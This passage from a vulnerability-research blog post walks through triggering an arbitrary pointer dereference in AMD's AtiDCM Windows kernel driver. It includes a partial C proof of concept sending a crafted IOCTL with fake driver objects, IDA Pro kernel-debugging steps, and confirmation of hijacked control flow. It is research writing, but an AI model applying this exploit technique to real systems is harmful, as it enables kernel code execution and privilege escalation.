        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &amp;bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}


int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);


  [...]

    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        [...]
    }

  arbitraryCallDriver(outputBuffer, SIZE_BUF);
    return 0;
}</pre>
</div>
<div>
<div>
<p>The <em>arbitraryCallDriver()</em> is the function that triggers the vulnerability and performs the following:</p>
<ol>
<li>Allocate the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">inputBuffer</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">inputBuffer</code> that will <strong>contain the final buffer that will be sent to driver</strong> through the DeviceIoControl WinAPI.</li>
<li>Allocate <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object</code>, set <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr</code> to point to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object+</span><span class="enlighter-n2">0x30</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object+0x30</code> (after the <em>_OBJECT_HEADER struct</em>) and fill the <em>_OBJECT_HEADER</em> with the dummy value 0x41.</li>
<li>Allocate <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object2</code> and fill its <em>_OBJECT_HEADER</em> with the dummy value 0x43.</li>
<li>Allocate <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DriverObject</code>, fill it with the dummy value 0x50 and <strong>set the target function pointer</strong>&nbsp;that will be called by the driver to be <strong>0xdeadbeef</strong>. Notice how we calculate the offset from <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DriverObject</code> to the target function pointer. First we set <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptrDriver</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptrDriver</code> to point to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DriverObject+</span><span class="enlighter-n2">0x30</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DriverObject+0x30</code> in order to skip the <em>_OBJECT_HEADER</em>. Then from <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptrDriver</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptrDriver</code> we <strong>sum 0x70</strong> (if you take the definition of <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DRIVER_OBJECT">_DRIVER_OBJECT</a> the <strong>start of the MajorFunction array is at 0x70</strong>) and then we sum <strong>0x1b*8</strong>. 8 because the <strong>size of a function pointer is 8 bytes in a x64 architecture</strong>. 0x1b because in the reversed <em>callDriver()</em> function the call to <em><strong>IoBuildSynchronousFsdRequest()</strong></em> is passing as first parameter <strong>IRP_MJ_PNP</strong>. If we give a look at the definition of <strong>IRP_MJ_PNP</strong> inside <a href="https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/km/wdm.h#L26620">wdm.h</a>, its value <strong>corresponds to 0x1b</strong>.</li>
<li>After that we set that the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">AttachedDevice</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">AttachedDevice</code> field of <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object</code> points to the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DeviceObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DeviceObject</code> inside <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object2</code> at <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object2+x030</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object2+x030</code>. The <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">AttachedDevice</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">AttachedDevice</code> field of <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object</code> can be now referenced also with <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr-&gt;AttachedDevice</code>.</li>
<li>Finally we set <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr-&gt;AttachedDevice-&gt;DriverObject</code> to point to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptrDriver</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptrDriver</code> (that contains our rogue <em>_DRIVER_OBJECT</em> with the function pointer that points to <strong>0xdeadbeef</strong>) and <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">DeviceObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr-&gt;AttachedDevice-&gt;DeviceObject</code> to <strong>NULL</strong> so that we can <strong>exit successfully from the for loop</strong> inside <em>IoGetAttachedDeviceReference()</em>.</li>
<li>We populate our <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">inputBuffer</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">inputBuffer</code> with the <strong>first byte equal to 0</strong> and the <strong><strong>subsequent 8 bytes containing the pointer to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr</code></strong></strong>(that is <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object+</span><span class="enlighter-n2">0x30</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object+0x30</code>). We must set the first byte equal to 0, because if you re-inspect the figure below you may notice the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">*</span><span class="enlighter-g1">(</span><span class="enlighter-text">_BYTE*</span><span class="enlighter-g1">)</span><span class="enlighter-text">systemBuffer_12</span><span class="enlighter-g1">)</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">if(*(_BYTE*)systemBuffer_12)</code> that may lead to a <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">goto completeRequest2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">goto completeRequest2</code>, where the <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">completeRequest2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">completeRequest2</code> label references a code location that <strong>exits from the function</strong> and <strong>won’t allow us to enter the vulnerable path</strong>. So by just <strong><strong>setting the first byte of&nbsp; <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">systemBuffer_12</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">systemBuffer_12</code></strong></strong><strong>&nbsp;to 0</strong> we can just skip this condition and reach our vulnerable function.</li>
</ol>
</div>
</div>
<p>&nbsp;</p>
<figure id="attachment_3811" aria-describedby="caption-attachment-3811" style="width: 608px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3811 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-25-1.png" alt="" width="608" height="666"><figcaption id="caption-attachment-3811" class="wp-caption-text">call to callDriver()</figcaption></figure>
<div>
<h3>Debugging with IDA Pro</h3>
<div>
<p>Crafting the proper inputBuffer and data structures in order to reach a vulnerability is typically difficult to do at the first shot. It usually requires debugging and a fair amount of trial and error.</p>
</div>
<div>
<p>For this reason, I’m going to show how to <strong>debug the driver with the assistance of IDA Pro Debugger</strong>. This proves to be particularly useful especially when you want to <strong>debug a routine and understand its behavior with the assistance of the pseudocode provided by IDA Pro</strong>.</p>
<p>You can setup the <strong>IDA Pro Debugger</strong> to do kernel debugging as follows:</p>
</div>
<ol>
<li>Press <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">f9</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">f9</code> or click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Debugger </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Select debugger...</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Debugger &gt; Select debugger...</code>.</li>
<li>Select the option <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Windbg debugger</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Windbg debugger</code>.</li>
<li>Click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Debugger </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> process options...</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Debugger &gt; process options...</code>.</li>
<li>In the connection string enter <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">net:port=</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">port</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">,key=</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">a.</span><span class="enlighter-m3">b</span><span class="enlighter-text">.</span><span class="enlighter-m3">c</span><span class="enlighter-text">.</span><span class="enlighter-m3">d</span><span class="enlighter-g1">&gt;</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">net:port=&lt;port&gt;,key=&lt;a.b.c.d&gt;</code> you can get the port and key values by typing <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">bcdedit /dbgsettings</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">bcdedit /dbgsettings</code> (run it as administrator) in your Windows VM.</li>
<li>Click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Debugger Debugger specific options</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Debugger Debugger specific options</code> and set <strong>Kernel mode debugging</strong> and click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Ok</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Ok</code>.</li>
<li>Click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Debugger Options</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Debugger Options</code> and check <strong>Autoload PDB files</strong>.</li>
</ol>
<div>You can now press the <strong>green play button</strong> on top and you will notice it will start <strong>loading PDB symbols</strong> for all the drivers loaded in the Windows VM.</div>
<div></div>
<div><em>We are actually just interested in loading symbols just for ntoskrnl.exe but I couldn’t find a way to specify it.</em></div>
<div>
<figure id="attachment_3820" aria-describedby="caption-attachment-3820" style="width: 1976px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3820 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-34-1.png" alt="" width="1976" height="976"><figcaption id="caption-attachment-3820" class="wp-caption-text">IDA Pro loading PDB symbols</figcaption></figure>
</div>
<div>
<p>At this point we are able to <strong>set breakpoints inside our vulnerable driver and debug it with the assistance of the pseudocode</strong> but we are <strong>not able to do the same with the ntoskrnl.exe</strong> module.</p>
<p>In particular, <strong>we would like to debug, assisted by the pseudocode, the functions called by <em>callDriver()</em></strong> such as <em>IoGetAttachedDeviceReference()</em>, <em>IoBuildSynchronousFsdRequest()</em> and <em>IofCallDriver()</em>.</p>
</div>
<div>
<p>We can achieve this as follows:</p>
<ol>
<li>Click <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">View </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Open subviews </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Segments</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">View &gt; Open subviews &gt; Segments</code> and right click on the <strong>nt</strong> module and select <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Edit segment</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Edit segment</code>.
<p></p><figure id="attachment_3822" aria-describedby="caption-attachment-3822" style="width: 1075px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3822 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-36-1.png" alt="" width="1075" height="436"><figcaption id="caption-attachment-3822" class="wp-caption-text">Modify nt segment – Step 1</figcaption></figure></li>
<li>&nbsp;<strong>Uncheck Debugger segment</strong>&nbsp;and <strong>check Loader segment </strong>(see <a href="https://hex-rays.com/blog/several-files-in-one-idb-part-3">here</a> for further details). Press Ok.
<p></p><figure id="attachment_3823" aria-describedby="caption-attachment-3823" style="width: 561px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3823 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-37-1.png" alt="" width="561" height="432"><figcaption id="caption-attachment-3823" class="wp-caption-text">Modify nt segment – Step 2</figcaption></figure></li>
</ol>
</div>
<div>You will see that IDA Pro starts performing the conversion:</div>
<div></div>
<div>
<figure id="attachment_3824" aria-describedby="caption-attachment-3824" style="width: 593px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3824 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-38-1.png" alt="" width="593" height="187"><figcaption id="caption-attachment-3824" class="wp-caption-text">IDA Pro popup converting debug to loader segment</figcaption></figure>
</div>
<div></div>
<div>Once it finishes, stop debugging by clicking the <strong>red stop button</strong> on the top. You can see IDA Pro deletes the debug segments but keeps the loader segments:</div>
<div>
<figure id="attachment_3825" aria-describedby="caption-attachment-3825" style="width: 496px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3825 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-39-1.png" alt="" width="496" height="285"><figcaption id="caption-attachment-3825" class="wp-caption-text">IDA Pro deleting debug segment</figcaption></figure>
</div>
<div>Once it finishes, we can see in the Functions tab a bunch of <strong>nt_xxx</strong> functions. These are the functions of the <strong>nt</strong>&nbsp;(ntoskrnl.exe) module that is now a <strong>loader segment</strong>. Wait for IDA Pro to analyze it:</div>
<div>
<figure id="attachment_3826" aria-describedby="caption-attachment-3826" style="width: 576px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3826 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-40-1.png" alt="" width="576" height="993"><figcaption id="caption-attachment-3826" class="wp-caption-text">Ntoskrnl.exe functions are now available</figcaption></figure>
</div>
<div>
<p><em>If you didn’t take a snpashot you will have to repeat the process everytime since IDA Pro will create another debugger nt segment at a different base address. With the snapshot, the base of your loader nt segment will always match with that of the debugger.</em></p>
</div>
<div>At this point we can select for example function <em>nt_IoGetAttachedDeviceReference</em> and we have the decompiled code (we will have to reverse again the functions by re-applying the proper function signatures and redefining the correct types for variables):</div>
<div>
<figure id="attachment_3827" aria-describedby="caption-attachment-3827" style="width: 1727px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3827 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-41-1.png" alt="" width="1727" height="761"><figcaption id="caption-attachment-3827" class="wp-caption-text">Decompiled view of IoGetAttachedDeviceReference()</figcaption></figure>
</div>
<div>So now we can restart debugging the VM (I suggest you to <strong>uncheck</strong> the <strong>Autoload PDB files</strong> under <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">Debugger Options</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">Debugger Options</code> in order to speed up the loading process). Let’s start placing a <strong>breakpoint</strong> at the beginning of the vulnerable path inside <em><strong>InnerIrpDeviceIoCtlHandler()</strong></em>:</div>
<div>
<figure id="attachment_3828" aria-describedby="caption-attachment-3828" style="width: 2006px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3828 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-42-1.png" alt="" width="2006" height="1008"><figcaption id="caption-attachment-3828" class="wp-caption-text">Setting a breakpoint</figcaption></figure>
</div>
<div>At this point we can recompile and launch our PoC and press enter (I’ve placed a <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-m0">getchar</span><span class="enlighter-g1">()</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">getchar()</code> in the code in order to view the output of the program):</div>
<div>
<figure id="attachment_3829" aria-describedby="caption-attachment-3829" style="width: 731px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3829 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-43-1.png" alt="" width="731" height="360"><figcaption id="caption-attachment-3829" class="wp-caption-text">Output of the PoC</figcaption></figure>
</div>
<div>You will notice the breakpoint was hit in IDA Pro:</div>
<div>
<figure id="attachment_3830" aria-describedby="caption-attachment-3830" style="width: 1680px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3830 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-44-1.png" alt="" width="1680" height="726"><figcaption id="caption-attachment-3830" class="wp-caption-text">Breakpoint hit in IDA PRO</figcaption></figure>
</div>
<div>At this point we can just <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">step into</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">step into</code>/ <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">step over</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">step over</code>/ <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">run to cursor</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">run to cursor</code> ( <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">f7</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">f7</code>/ <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">f8</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">f8</code>/ <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">f4</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">f4</code>) until we reach the call to our arbitrary pointer inside <em><strong>IofCallDriver()</strong></em>. In my opinion, it may be really helpful to <strong>debug the pseudocode along with the runtime values of variables</strong>.</div>
<div></div>
<div>Here’s an example while debugging <em>callDriver()</em>:</div>
<div>
<figure id="attachment_3831" aria-describedby="caption-attachment-3831" style="width: 2164px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3831 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-45-1.png" alt="" width="2164" height="501"><figcaption id="caption-attachment-3831" class="wp-caption-text">View of IDA Pro with pseudocode and variables</figcaption></figure>
</div>
<div>After stepping into the debugger we eventually reach a call to <strong>_guard_dispatch_icall</strong> having in <strong>rax</strong> the value <strong>0xdeadbeef</strong>.</div>
</div>
<div></div>
<div>
<figure id="attachment_3832" aria-describedby="caption-attachment-3832" style="width: 2121px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3832 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-46-1.png" alt="" width="2121" height="606"><figcaption id="caption-attachment-3832" class="wp-caption-text">_guard_dispatch_icall()</figcaption></figure>
</div>
<div></div>
<div>
<div>
<div>
<div>If you keep stepping inside <em>_guard_dispatch_icall()</em> you will get a <strong>bug check error </strong>because 0xdeadbeef is not a valid kernel address.</div>
<div>
<p>Let’s try changing 0xdeadbeef with a <strong>real kernel address</strong>. In this case I took </p><div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">nt!ZwFlushInstructionCache+</span><span class="enlighter-n2">0x14</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">nt!ZwFlushInstructionCache+0x14</code>.<p></p>
</div>
</div>
</div>
</div>
<div></div>
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">*</span><span class="enlighter-g1">((</span><span class="enlighter-text">PDWORD64</span><span class="enlighter-g1">)</span><span class="enlighter-text">pDriverFunction</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = </span><span class="enlighter-n2">0xFFFFF80025E14C04</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span></div></div></div><div class="enlighter-raw">[...]
*((PDWORD64)pDriverFunction) = 0xFFFFF80025E14C04;
[...]</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">[...]
*((PDWORD64)pDriverFunction) = 0xFFFFF80025E14C04;
[...]</pre>
<div>
<div>If you relaunch the updated PoC you will see you can reach a <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">jmp rax</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">jmp rax</code> inside <em>_guard_dispatch_icall</em> where <strong>rax</strong>&nbsp;<strong>is our</strong> <strong>arbitrary function pointer</strong>, as you can see in the following screenshot (I suggest to <strong>remove the IDA Pro Pseudocode view</strong> when you are in routines such as <em>_guard_dispatch_icall</em> as IDA Pro will complain about not been able to create the pseudocode).</div>
<div>
<figure id="attachment_3834" aria-describedby="caption-attachment-3834" style="width: 2093px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3834 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-48-1.png" alt="" width="2093" height="983"><figcaption id="caption-attachment-3834" class="wp-caption-text">jmp rax inside _guard_disaptch_icall()</figcaption></figure>
</div>
</div>
<div>
<div>
<div>
<p>It is important to <strong>check what registers we control</strong>. As we can see, we control <strong>RBX</strong>, <strong>RCX</strong>&nbsp;and <strong>RDI</strong> by cross-checking the address values printed by our program. In fact we may notice that </p><div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">rbx</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">rbx</code> corresponds to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object+</span><span class="enlighter-n2">0x30</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object+0x30</code>/ <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">ptr</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">ptr</code>, while <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">rcx</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">rcx</code>&nbsp;and <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">rdi</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">rdi</code> corresponds to <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object2+</span><span class="enlighter-n2">0x30</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object2+0x30</code>.<p></p>
</div>
<div>
<p>At this point we know <strong>we can redirect execution to an arbitrary address</strong> and that we control registers <strong>RBX</strong>, <strong>RCX</strong> and <strong>RDI</strong>.</p>
</div>
</div>
</div>
<h2>Wrapping up</h2>
<p>In this second part of the <a href="https://hnsecurity.it/tag/atdcm64a/">series</a> we successfully confirmed both vulnerabilities by retrieving the base address of ntoskrnl.exe and hijacking the execution flow, annotating what the controlled registers are.</p>
<p>In the <a href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/">next and final part</a> we will finally <strong>exploit the vulnerabilities</strong> in order to achieve <strong>Local Privilege Escalation</strong>. Stay tuned!</p>
</div>
</div><div class="uncode_text_column mt-5"><span class="post-tags"><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/exploit-development/">exploit development</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/exploit/">exploit</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/ida/">ida</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/vulnerability-research/">vulnerability research</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/reverse-engineering/">reverse engineering</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/static-analysis/">static analysis</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/windows/">windows</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/tutorial/">Tutorial</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/red-teaming/">red teaming</a><a class="custom-tag-box" href="https://hnsecurity.it/blog/tag/atdcm64a/">atdcm64a</a></span>
